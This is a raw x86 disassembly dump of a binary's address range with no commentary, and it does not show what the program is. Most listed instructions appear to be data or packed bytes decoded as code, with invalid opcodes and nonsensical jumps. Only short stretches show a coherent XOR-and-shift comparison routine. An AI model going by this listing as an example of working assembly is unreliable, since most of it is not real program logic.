  407c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8a:	loope  0x407c75
  407c8c:	and    DWORD PTR [ebx+0x3dd55932],ecx
  407c92:	xchg   ebp,eax
  407c93:	ins    BYTE PTR es:[edi],dx
  407c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c95:	aad    0x2
  407c97:	fistp  DWORD PTR [edi-0x69]
  407c9a:	sti    
  407c9b:	add    al,cl
  407c9d:	sbb    edx,ecx
  407c9f:	stos   DWORD PTR es:[edi],eax
  407ca0:	adc    al,0x34
  407ca2:	mov    ebx,eax
  407ca4:	inc    edx
  407ca5:	(bad)  
  407ca6:	retf   0x5f27
  407ca9:	xchg   ebx,eax
  407caa:	cmp    al,BYTE PTR [eax-0x71]
  407cad:	jmp    0xfa8f04f
  407cb2:	cwde   
  407cb3:	popf   
  407cb4:	jl     0x407c50
  407cb6:	shr    DWORD PTR [ebx+esi*8+0x307feab1],0x58
  407cbe:	loop   0x407c4c
  407cc0:	mov    ds:0x8469cf61,al
  407cc5:	add    al,0xe7
  407cc7:	mov    al,ds:0xf6e02128
  407ccc:	scas   al,BYTE PTR es:[edi]
  407ccd:	inc    ebx
  407cce:	loop   0x407ce2
  407cd0:	add    cl,BYTE PTR [ecx+ecx*1+0x6]
  407cd4:	xchg   edi,eax
  407cd5:	push   ecx
  407cd6:	sahf   
  407cd7:	dec    edx
  407cd8:	fist   DWORD PTR [edx-0x47]
  407cdb:	cs jmp 0x407d0b
  407cde:	mov    ah,0xff
  407ce0:	test   DWORD PTR [ebx+0x2d88f3db],0x2b254d43
  407cea:	std    
  407ceb:	pop    ecx
  407cec:	mov    esp,DWORD PTR [edi]
  407cee:	cmp    eax,0xdec6f99c
  407cf3:	xchg   esi,eax
  407cf4:	sbb    DWORD PTR [edx],0x6c
  407cf7:	mov    ebp,0x1b43e9da
  407cfc:	mov    ebp,0x5d2c1ddb
  407d01:	sbb    BYTE PTR [edx+0xb69a299],al
  407d07:	loope  0x407d60
  407d09:	jge    0x407cb8
  407d0b:	mov    al,ds:0x1c89214c
  407d10:	sub    eax,0xf190f3b2
  407d15:	(bad)  
  407d16:	mov    edi,0xb2893772
  407d1b:	icebp  
  407d1c:	mov    ebp,0x4e8f1f8b
  407d21:	leave  
  407d22:	popa   
  407d23:	(bad)  
  407d24:	adc    al,0xda
  407d26:	inc    esi
  407d27:	sbb    DWORD PTR [edx+edi*1+0x103f5bf4],edx
  407d2e:	add    dh,cl
  407d30:	lahf   
  407d31:	dec    esi
  407d32:	mov    edx,0x9bc535ee
  407d37:	dec    esp
  407d38:	or     ecx,ebx
  407d3a:	add    dl,BYTE PTR [ebp+0x0]
  407d3d:	jb     0x407d41
  407d3f:	mov    eax,ds:0xb593af82
  407d44:	outs   dx,BYTE PTR ds:[esi]
  407d45:	jle    0x407cda
  407d47:	arpl   WORD PTR ds:0x7cc24546,di
  407d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d4e:	pop    es
  407d4f:	shl    BYTE PTR [esi+0x53],0x1
  407d53:	test   al,0x9b
  407d55:	xchg   ebp,edx
  407d57:	scas   eax,DWORD PTR es:[edi]
  407d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d59:	js     0x407dcb
  407d5b:	(bad)  
  407d5c:	dec    edx
  407d5d:	cmp    DWORD PTR [esi-0x3],edi
  407d60:	adc    al,0xee
  407d62:	adc    cl,bh
  407d64:	fsub   DWORD PTR [eax+0x2a]
  407d67:	enter  0x750e,0xfc
  407d6b:	ficom  WORD PTR [esi-0x70a65c2d]
  407d71:	sub    BYTE PTR [ebx-0x742280f5],ah
  407d77:	out    0x82,al
  407d79:	mov    esi,0x857c6400
  407d7e:	push   edx
  407d7f:	xchg   esp,eax
  407d80:	dec    BYTE PTR [eax+0x37b914ea]
  407d86:	add    BYTE PTR [edx-0x58],ah
  407d89:	mov    ch,0xb9
  407d8b:	adc    DWORD PTR [ebx-0x4d],esp
  407d8e:	cmp    BYTE PTR [esi-0x3db1242a],ah
  407d94:	(bad)  
  407d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d96:	cmp    al,BYTE PTR [ecx+ecx*4]
  407d99:	xor    DWORD PTR [eax+0x2b1d4ed9],edx
  407d9f:	cmp    DWORD PTR [eax+0x3a50ff9b],0xffffffef
  407da6:	sub    ebp,eax
  407da8:	dec    ecx
  407da9:	mov    ds:0x5a174a0c,eax
  407dae:	cmp    eax,0x199b190a
  407db3:	or     BYTE PTR [edi+0x4706f6fd],dh
  407db9:	call   0xf752dfc5
  407dbe:	push   ds
  407dbf:	ins    DWORD PTR es:[edi],dx
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xaa8e87e
  407e7d:	jle    0x407ea1
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [esi+0x21],bh
  407e88:	jmp    0x6131b586
  407e8d:	mov    ds:0x6525ddde,eax
  407e92:	push   edx
  407e93:	mov    al,0xd2
  407e95:	sub    al,0xff
  407e97:	pop    edi
  407e98:	repz jno 0x407e8a
  407e9b:	je     0x407e22
  407e9d:	pop    es
  407e9e:	add    edi,DWORD PTR [edx+0x17fce62d]
  407ea4:	push   edi
  407ea5:	inc    ebx
  407ea6:	mov    al,0x75
  407ea8:	or     al,0x2e
  407eaa:	cmp    al,ah
  407eac:	shl    BYTE PTR ds:0xf22834ec,0xc4
  407eb3:	sub    dl,dh
  407eb5:	dec    ebp
  407eb6:	std    
  407eb7:	mov    eax,ds:0x6ab4791f
  407ebc:	mov    cl,0x8d
  407ebe:	ss mov eax,0xf891e09d
  407ec4:	sahf   
  407ec5:	out    dx,eax
  407ec6:	jnp    0x407efa
  407ec8:	dec    ecx
  407ec9:	lea    edi,[eax-0x5d9a50ed]
  407ecf:	int3   
  407ed0:	in     al,dx
  407ed1:	in     eax,dx
  407ed2:	and    ch,cl
  407ed4:	cmp    eax,0xb591db07
  407ed9:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  407edb:	aaa    
  407edc:	mov    cl,0x4b
  407ede:	iret   
  407edf:	jno    0x407f5b
  407ee1:	loop   0x407ebf
  407ee3:	sbb    ecx,0xc9c35d08
  407ee9:	jb     0x407ead
  407eeb:	ds and ax,0xd6f5
  407ef0:	mov    bh,0xdb
  407ef2:	jo     0x407ebc
  407ef4:	push   esp
  407ef5:	jno    0x407f1e
  407ef7:	inc    esi
  407ef8:	push   0x4f
  407efa:	sub    al,0xcc
  407efc:	cmp    DWORD PTR [ebx-0x9463e78],ebx
  407f02:	ss sahf 
  407f04:	lock and edx,DWORD PTR [esi-0x7c308eac]
  407f0b:	test   al,0x3f
  407f0d:	cmp    DWORD PTR [ebp-0x4f969ef6],edx
  407f13:	test   eax,0x117c37d7
  407f18:	xchg   ebx,esi
  407f1a:	jecxz  0x407ee6
  407f1c:	out    dx,al
  407f1d:	popf   
  407f1e:	out    0xa3,al
  407f20:	mov    eax,?
  407f22:	test   DWORD PTR [edx+0x2ca76b61],edi
  407f28:	adc    DWORD PTR [esp+edx*8],eax
  407f2b:	jns    0x407f68
  407f2d:	retf   
  407f2e:	mov    ?,WORD PTR [edx+edx*4+0x6479f83a]
  407f35:	xchg   ebx,eax
  407f36:	fnstenv [ecx+0x71e09ff5]
  407f3c:	fsubr  DWORD PTR [ebx+0x2850ffd1]
  407f42:	fs inc esi
  407f44:	popf   
  407f45:	rcr    dh,cl
  407f47:	mov    WORD PTR [esi+0x4ebaa784],fs
  407f4d:	sbb    DWORD PTR [edx],0x4177beb7
  407f53:	cmp    al,0xfb
  407f55:	sbb    esi,ebx
  407f57:	rcr    DWORD PTR [ebx],1
  407f59:	fcomp  DWORD PTR [ecx]
  407f5b:	repz cld 
  407f5d:	inc    ebx
  407f5e:	sub    bh,BYTE PTR [ecx]
  407f60:	sar    DWORD PTR [esi],0x39
  407f63:	jae    0x407f04
  407f65:	aaa    
  407f66:	test   BYTE PTR ds:0x7cb8d5b9,dl
  407f6c:	jg     0x407f05
  407f6e:	jmp    0xbc6e:0x58049841
  407f75:	test   DWORD PTR [edx+0x3c],0xce148b7b
  407f7c:	adc    esp,ecx
  407f7e:	inc    edi
  407f7f:	inc    edx
  407f80:	add    DWORD PTR [ebp-0x4fd37030],edi
  407f86:	mov    ebx,0xd8c5c4f5
  407f8b:	mov    dh,0x81
  407f8d:	inc    ecx
  407f8e:	aaa    
  407f8f:	test   DWORD PTR [edi+0x67],ecx
  407f92:	(bad)  [esi+0x96485c7]
  407f98:	jbe    0x407fd9
  407f9a:	repnz popf 
  407f9c:	xchg   DWORD PTR [ebx+0x19],edx
  407f9f:	fsub   DWORD PTR [eax-0x6a]
  407fa2:	lea    esi,[esi-0x476252b1]
  407fa8:	sbb    dl,BYTE PTR [ecx]
  407faa:	pop    edx
  407fab:	imul   eax,DWORD PTR [edx-0x73053923],0x5d
  407fb2:	out    dx,eax
  407fb3:	cmp    eax,0xe8bfbce0
  407fb8:	cmp    BYTE PTR [ebp+0x66fe0015],ah
  407fbe:	mov    bl,0xb
  407fc0:	stc    
  407fc1:	dec    eax
  407fc2:	adc    ecx,esp
  407fc4:	xchg   edi,eax
  407fc5:	mov    bh,0x48
  407fc7:	(bad)  
  407fc8:	dec    ebx
  407fc9:	jge    0x407f63
  407fcb:	ins    DWORD PTR es:[edi],dx
  407fcc:	and    BYTE PTR [edx],0xc3
  407fcf:	add    eax,0xae25f016
  407fd4:	ss or  al,0x2
  407fd7:	push   ebp
  407fd8:	sbb    DWORD PTR [eax+0x7e83cf10],0xa6584b7d
  407fe2:	lahf   
  407fe3:	inc    edi
  407fe4:	into   
  407fe5:	stos   DWORD PTR es:[edi],eax
  407fe6:	mov    eax,0x3dd4412e
  407feb:	sub    ebp,DWORD PTR [edx+0x52589f51]
  407ff1:	xlat   BYTE PTR ds:[ebx]
  407ff2:	xor    esp,ebp
  407ff4:	inc    edi
  407ff5:	retf   0x11df
  407ff8:	xchg   ecx,eax
  407ffa:	mov    ?,WORD PTR [eax+0x11]
  407ffd:	mov    BYTE PTR [ebx-0x63],0xa4
  408001:	mov    eax,ds:0x74a8da89
  408006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408007:	ficom  WORD PTR [ecx-0x15]
  40800a:	or     DWORD PTR [edi],ecx
  40800c:	mov    ebx,0x1ca60606
  408011:	sti    
  408012:	scas   eax,DWORD PTR es:[edi]
  408013:	ss mov ebx,cs
  408016:	and    al,0xd5
  408018:	jbe    0x407fa9
  40801a:	xor    esi,eax
  40801c:	ins    BYTE PTR es:[edi],dx
  40801d:	ror    DWORD PTR [edx+0x22],cl
  408020:	mov    bl,0xf2
  408022:	jmp    0x408095
  408024:	cmc    
  408025:	cmc    
  408026:	cdq    
  408027:	add    al,0x2d
  408029:	popf   
  40802a:	pop    edi
  40802b:	shl    ebx,cl
  40802d:	mov    al,ds:0xc23628d9
  408032:	dec    esp
  408033:	push   ecx
  408034:	lock fwait
  408036:	loope  0x407fd9
  408038:	(bad)  
  408039:	clc    
  40803a:	(bad)  
  40803b:	aam    0xfc
  40803d:	mov    bh,0x15
  40803f:	inc    edx
  408040:	sub    eax,DWORD PTR [ecx+0x3b]
  408043:	jmp    0x40804b
  408045:	fstp   TBYTE PTR [esi]
  408047:	lea    ecx,[esi-0x6e]
  40804a:	(bad)  
  40804b:	push   edx
  40804c:	sti    
  40804d:	mov    ds:0x2c8a8aa3,eax
  408052:	or     esp,DWORD PTR [ebx-0xa5f5d30]
  408058:	test   eax,0xf11fd029
  40805d:	jmp    DWORD PTR [bx+si]
  408060:	sahf   
  408061:	adc    al,ah
  408063:	aad    0x93
  408065:	mov    al,bl
  408067:	ss in  eax,dx
  408069:	push   ds
  40806a:	stos   DWORD PTR es:[edi],eax
  40806b:	stc    
  40806c:	inc    esp
  40806d:	xchg   ebp,eax
  40806e:	dec    ebx
  40806f:	icebp  
  408070:	pop    ecx
  408071:	rol    edi,1
  408073:	popf   
  408074:	push   ebp
  408075:	jl     0x4080c8
  408077:	sbb    ecx,DWORD PTR [esi*8+0x36020d9c]
  40807e:	mov    ebx,0x3ad766a3
  408083:	jmp    0x813bde09
  408088:	rol    DWORD PTR [edx-0x63663e2c],1
  40808e:	stos   BYTE PTR es:[edi],al
  40808f:	pop    edx
  408090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408091:	fwait
  408092:	xlat   BYTE PTR ds:[ebx]
  408093:	dec    esi
  408094:	dec    edi
  408095:	arpl   WORD PTR [ebx],di
  408097:	xchg   ecx,eax
  408098:	scas   al,BYTE PTR es:[edi]
  408099:	add    DWORD PTR [edi-0xb],edx
  40809c:	xchg   ebx,eax
  40809d:	nop
  40809e:	into   
  40809f:	xor    eax,0xf28a2b1a
  4080a4:	pop    esi
  4080a5:	loop   0x4080e7
  4080a7:	mov    cs,WORD PTR [edx]
  4080a9:	inc    esi
  4080aa:	push   0x7cf299f3
  4080af:	(bad)  
  4080b0:	push   ds
  4080b1:	mov    esi,0x6c1ed883
  4080b6:	adc    eax,0x253a8ab7
  4080bb:	sub    DWORD PTR [esi],ecx
  4080bd:	iret   
  4080be:	cmp    eax,0x2d82e331
  4080c3:	push   edx
  4080c4:	test   al,0xa7
  4080c6:	mov    esi,DWORD PTR [ecx+edx*1+0x19]
  4080ca:	xlat   BYTE PTR ds:[ebx]
  4080cb:	adc    esp,DWORD PTR [ecx+0xd60a30f]
  4080d1:	aaa    
  4080d2:	push   ss
  4080d3:	fwait
  4080d4:	sub    esp,DWORD PTR [edx+0x7d]
  4080d7:	add    DWORD PTR [esi+eiz*1-0x16363d5f],eax
  4080de:	add    eax,0x384a0aa4
  4080e3:	fwait
  4080e4:	mov    ah,0x1
  4080e6:	jno    0x4080a3
  4080e8:	push   ebp
  4080e9:	pop    es
  4080ea:	push   ebp
  4080eb:	add    BYTE PTR [edx],ch
  4080ed:	shl    BYTE PTR [ebx],cl
  4080ef:	lock sbb dl,al
  4080f2:	mov    ch,0x46
  4080f4:	sbb    al,0x82
  4080f6:	dec    esi
  4080f7:	(bad)  
  4080f8:	jae    0x4080bc
  4080fa:	sti    
  4080fb:	jno    0x40811f
  4080fd:	int3   
  4080fe:	adc    al,0xf5
  408100:	mov    edx,0xcc4f0be6
  408105:	mov    dh,0xa7
  408107:	(bad)  
  408108:	sub    eax,0xf7e3c1cf
  40810d:	dec    esp
  40810e:	lds    esi,FWORD PTR [ecx+ecx*1-0x1b]
  408112:	or     al,0xde
  408114:	iret   
  408115:	sub    ebp,DWORD PTR [esp+ebp*1-0x3400639f]
  40811c:	push   0x2c324a2c
  408121:	jno    0x40817f
  408123:	dec    eax
  408124:	shl    DWORD PTR [edx+ebx*1+0x2b39176],0x45
  40812c:	mov    al,ds:0xf8114a97
  408131:	test   al,0xa9
  408133:	ret    0xe273
  408136:	call   0x1589de76
  40813b:	xchg   BYTE PTR [ebx-0x27],bl
  40813e:	cwde   
  40813f:	fnstenv [esi-0x259d0041]
  408145:	push   edi
  408146:	js     0x408134
  408148:	mov    edi,0x30be91f1
  40814d:	es js  0x408181
  408150:	or     BYTE PTR [ebx-0x1ab04d5e],al
  408156:	xlat   BYTE PTR ds:[ebx]
  408157:	mov    edx,0x54bdc305
  40815c:	mov    dh,0x73
  40815e:	jmp    0x7f16:0xb5406be1
  408165:	cmp    eax,0x9ba493ad
  40816a:	(bad)  
  40816b:	push   ebp
  40816c:	mov    ecx,0x3d03d879
  408171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408172:	or     dl,BYTE PTR [ebp-0x22]
  408175:	out    0x66,al
  408177:	push   ecx
  408178:	(bad)  
  408179:	sub    ch,dh
  40817b:	or     BYTE PTR [ecx+0x6c67270b],bh
  408181:	pusha  
  408182:	aaa    
  408183:	outs   dx,DWORD PTR ds:[esi]
  408184:	push   edi
  408185:	and    ah,BYTE PTR [esi+0x2f]
  408188:	pop    edi
  408189:	pop    esp
  40818a:	lock clc 
  40818c:	pop    edx
  40818d:	jne    0x40820b
  40818f:	ja     0x40815a
  408191:	mov    edi,0xc8bcdd8d
  408196:	adc    BYTE PTR [edi],ah
  408198:	sub    eax,0x556fd365
  40819d:	or     bh,BYTE PTR [ebx+0x4c]
  4081a0:	xchg   BYTE PTR [ebx+0x1c2f450f],ah
  4081a6:	and    edi,0x2f850a14
  4081ac:	popf   
  4081ad:	dec    eax
  4081ae:	and    eax,0x6c249bc3
  4081b3:	sti    
  4081b4:	loop   0x40818e
  4081b6:	jmp    0xdd1e046d
  4081bb:	fcomi  st,st(0)
  4081bd:	sahf   
  4081be:	(bad)  
  4081bf:	(bad)  
  4081c1:	and    eax,0x621e20b7
  4081c6:	push   eax
  4081c7:	push   edi
  4081c8:	ret    
  4081c9:	sub    BYTE PTR ds:[edx-0x68],al
  4081cd:	mov    dl,BYTE PTR [esi-0x4a9bee03]
  4081d3:	push   ss
  4081d4:	push   edi
  4081d5:	pop    eax
  4081d6:	pop    es
  4081d7:	push   ebx
  4081d8:	inc    ecx
  4081d9:	stc    
  4081da:	sar    BYTE PTR [edx+ebx*2],0xb
  4081de:	pop    ebx
  4081df:	cmp    eax,0xc9a47d75
  4081e4:	inc    ebx
  4081e5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4081e7:	sub    eax,0x4374241b
  4081ec:	push   ebp
  4081ed:	ja     0x408223
  4081ef:	clc    
  4081f0:	in     eax,dx
  4081f1:	mov    ecx,0xbe1efda6
  4081f6:	shr    ah,0x90
  4081f9:	adc    eax,0xc5b91a9d
  4081fe:	inc    ecx
  4081ff:	inc    ecx
  408200:	adc    DWORD PTR [esi+0xe],ecx
  408203:	gs fwait
  408205:	stos   WORD PTR es:[edi],ax
  408207:	ret    0x2a7d
  40820a:	push   eax
  40820b:	dec    ebx
  40820c:	push   ebp
  40820d:	lahf   
  40820e:	loopne 0x4081a0
  408210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408211:	repnz sub DWORD PTR [ebp-0x3aaa6f1d],eax
  408218:	test   BYTE PTR [edi+0x7d1008a4],0x6b
  40821f:	add    DWORD PTR [esi-0x5d4a8659],edx
  408225:	pop    ds
  408226:	pop    edx
  408227:	fstp   st(7)
  408229:	imul   esi,esp,0x25809891
  40822f:	inc    ebx
  408230:	in     al,0x6c
  408232:	fidiv  DWORD PTR [esi]
  408234:	gs ins DWORD PTR es:[edi],dx
  408236:	add    edx,DWORD PTR [edi+esi*2]
  408239:	ja     0x408270
  40823b:	jb     0x408295
  40823d:	and    edi,ebx
  40823f:	mov    edx,0x47e364cd
  408244:	scas   al,BYTE PTR es:[edi]
  408245:	pushf  
  408246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408247:	mov    DWORD PTR [ebp-0x6c],eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x663f709d
  40828a:	fnstsw WORD PTR [esi-0x58]
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    bh,ah
  408295:	and    bl,BYTE PTR [edi]
  408297:	stc    
  408298:	out    0x5f,eax
  40829a:	add    DWORD PTR [esi-0x58],ecx
  40829d:	fsub   DWORD PTR [ebp-0x1c91fbc3]
  4082a3:	xchg   DWORD PTR cs:[ebx],ecx
  4082a6:	jge    0x408256
  4082a8:	xor    al,0x85
  4082aa:	sbb    bh,dh
  4082ac:	mov    cl,0x7d
  4082ae:	js     0x4082c1
  4082b0:	and    al,0xec
  4082b2:	ror    BYTE PTR [ecx+eax*2+0x70],1
  4082b6:	sbb    edx,ebp
  4082b8:	dec    esp
  4082b9:	in     eax,0xef
  4082bb:	not    BYTE PTR [esi-0x76d063c]
  4082c1:	and    BYTE PTR [esi],cl
  4082c3:	or     ebx,esp
  4082c5:	sahf   
  4082c6:	and    eax,0x2f64a943
  4082cb:	inc    edx
  4082cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082cd:	mov    dh,0xa8
  4082cf:	test   al,0xf
  4082d1:	imul   ebx
  4082d3:	repnz outs dx,BYTE PTR ds:[esi]
  4082d5:	sub    al,0xb8
  4082d7:	xor    bh,BYTE PTR [esi-0x3e]
  4082da:	and    BYTE PTR [edx-0xb97936a],bl
  4082e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e1:	sub    eax,0x4cedf9cc
  4082e6:	cld    
  4082e7:	in     eax,0xaf
  4082e9:	arpl   WORD PTR [edi],cx
  4082eb:	(bad)  
  4082ec:	xchg   ecx,eax
  4082ed:	int3   
  4082ee:	xor    al,0x8e
  4082f0:	sub    DWORD PTR [esi-0x1f],ebx
  4082f3:	dec    esp
  4082f4:	outs   dx,DWORD PTR ds:[esi]
  4082f5:	lock jge 0x408358
  4082f8:	ret    0xa9df
  4082fb:	call   0x61aa4a69
  408300:	mov    esi,0x59d05926
  408305:	call   0x4a06b285
  40830a:	sahf   
  40830b:	hlt    
  40830c:	int    0x59
  40830e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40830f:	jecxz  0x408318
  408311:	push   edx
  408312:	push   0xbce01f98
  408317:	mov    dh,0xeb
  408319:	je     0x4082da
  40831b:	in     eax,dx
  40831c:	dec    eax
  40831d:	push   edx
  40831e:	pop    es
  40831f:	ret    
  408320:	dec    edi
  408321:	out    dx,al
  408322:	and    bh,BYTE PTR [edi+0xe41d521]
  408328:	lea    edx,[edx+edx*4-0x35aaef32]
  40832f:	enter  0xdfb8,0x18
  408333:	inc    ebx
  408334:	jb     0x4082bb
  408336:	adc    esi,ebx
  408338:	and    eax,0xd568784f
  40833d:	test   DWORD PTR [edi+edi*1-0x7091017c],esi
  408344:	cmp    BYTE PTR [esi+0x37],0xa6
  408348:	adc    al,cl
  40834a:	inc    edi
  40834b:	pop    edi
  40834c:	xor    ecx,eax
  40834e:	push   edi
  40834f:	div    DWORD PTR [ecx-0x8]
  408352:	aad    0x35
  408354:	add    dh,BYTE PTR [ecx-0x7ce4980f]
  40835a:	in     eax,dx
  40835b:	push   cs
  40835c:	cdq    
  40835d:	inc    eax
  40835e:	mov    dl,0x82
  408360:	pop    ss
  408361:	inc    edx
  408362:	dec    ebx
  408363:	shr    BYTE PTR [edx],cl
  408365:	cmc    
  408366:	cmp    esi,edi
  408368:	pusha  
  408369:	mov    ah,0xb3
  40836b:	popa   
  40836c:	adc    DWORD PTR [ebx+0x3f7ad441],eax
  408372:	xchg   edi,eax
  408373:	mov    ah,0x3b
  408375:	lahf   
  408376:	scas   eax,DWORD PTR es:[edi]
  408377:	out    0x4d,al
  408379:	pop    eax
  40837a:	push   esi
  40837b:	iret   
  40837c:	and    al,BYTE PTR [ebx+0x0]
  40837f:	and    bh,BYTE PTR [ebx+0x7b643082]
  408385:	mov    ebx,0x2942a38c
  40838a:	mul    ecx
  40838c:	and    ch,dh
  40838e:	inc    edi
  40838f:	push   ds
  408390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408391:	daa    
  408392:	cwde   
  408393:	loop   0x408353
  408395:	push   ebx
  408396:	jne    0x4083e3
  408398:	mov    eax,ds:0xeb991498
  40839d:	and    BYTE PTR [ebx-0x244c27c9],dh
  4083a3:	pop    edx
  4083a4:	add    bh,ch
  4083a6:	xchg   ebp,eax
  4083a7:	inc    ecx
  4083a8:	dec    esp
  4083a9:	ds sub esi,edx
  4083ac:	into   
  4083ad:	rol    DWORD PTR [edi],1
  4083af:	mov    ds:0xb736330f,eax
  4083b4:	ds retf 0x2b21
  4083b8:	scas   al,BYTE PTR es:[edi]
  4083b9:	popf   
  4083ba:	scas   al,BYTE PTR es:[edi]
  4083bb:	stc    
  4083bc:	jne    0x408368
  4083be:	mov    eax,ds:0x2976762c
  4083c3:	test   BYTE PTR [ebp*2+0x462a801],cl
  4083ca:	in     al,0x14
  4083cc:	in     eax,dx
  4083cd:	push   edi
  4083ce:	stos   DWORD PTR es:[edi],eax
  4083cf:	test   al,0xf1
  4083d1:	cwde   
  4083d2:	jns    0x4083e2
  4083d4:	dec    eax
  4083d5:	dec    esp
  4083d6:	loopne 0x4083d7
  4083d8:	jp     0x4083f4
  4083da:	cmp    ebx,DWORD PTR [ebx]
  4083dc:	out    dx,eax
  4083dd:	aaa    
  4083de:	in     eax,0x5a
  4083e0:	je     0x408440
  4083e2:	dec    ebx
  4083e3:	dec    eax
  4083e4:	cwde   
  4083e5:	lea    edi,[edi]
  4083e7:	xlat   BYTE PTR ds:[ebx]
  4083e8:	xchg   esp,eax
  4083e9:	loop   0x4083eb
  4083eb:	pushf  
  4083ec:	ror    esp,1
  4083ee:	jo     0x40844f
  4083f0:	sbb    al,0x75
  4083f2:	(bad)  
  4083f3:	jb     0x4083e5
  4083f5:	pop    esp
  4083f6:	ja     0x4083f3
  4083f8:	xor    BYTE PTR [edx],dh
  4083fa:	sbb    al,0x25
  4083fc:	xchg   ecx,eax
  4083fd:	out    0xb5,eax
  4083ff:	sahf   
  408400:	push   eax
  408401:	cmc    
  408402:	(bad)  
  408403:	in     al,0x37
  408405:	ins    BYTE PTR es:[edi],dx
  408406:	and    BYTE PTR [ebp+0x3a],ah
  408409:	sar    edi,0xc7
  40840c:	cmp    esi,DWORD PTR [edi+ecx*8]
  40840f:	push   es
  408410:	push   ebx
  408411:	xchg   edx,eax
  408412:	rcl    DWORD PTR [edx],0x2e
  408415:	loop   0x408492
  408417:	not    DWORD PTR [esi+0x44]
  40841a:	xchg   BYTE PTR [eax-0x11],dl
  40841d:	ins    DWORD PTR es:[edi],dx
  40841e:	std    
  40841f:	test   ah,ah
  408421:	dec    ebx
  408422:	xor    al,0x2a
  408424:	test   DWORD PTR [esi-0x17],0x237719bf
  40842b:	push   cs
  40842c:	in     al,0xaa
  40842e:	add    al,0xd2
  408430:	or     BYTE PTR [eax-0x71],al
  408433:	push   edi
  408434:	outs   dx,BYTE PTR ds:[esi]
  408435:	and    BYTE PTR [edx],0x92
  408438:	out    0x83,eax
  40843a:	sahf   
  40843b:	popf   
  40843c:	sbb    BYTE PTR [edi+eax*2-0x75],dl
  408440:	sbb    DWORD PTR [esi+0xec576e4],esp
  408446:	mov    dh,dl
